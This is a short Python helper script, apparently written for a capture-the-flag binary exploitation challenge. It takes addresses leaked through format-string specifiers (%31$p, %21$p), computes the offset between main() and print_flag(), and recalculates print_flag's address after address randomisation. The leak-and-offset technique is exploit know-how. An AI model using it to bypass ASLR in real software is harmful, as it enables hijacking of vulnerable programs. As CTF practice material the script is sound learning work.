main = int("0x000055b6597b2401", 16) #%31$p
print_flag = int("0x000055b6597b2269", 16)
diff_1 = main - print_flag

ev_return_addr = int("0x000055b6597b2413", 16) #%21$p
diff_2 = ev_return_addr - print_flag

def print_new_pf():
    main_new_input = input("Give me new main() address:")
    main_new = int(main_new_input, 16)
    print_flag_new = main_new - diff_1
    print_flag_new = hex(print_flag_new)
    print("New print_flag() address: " + print_flag_new)
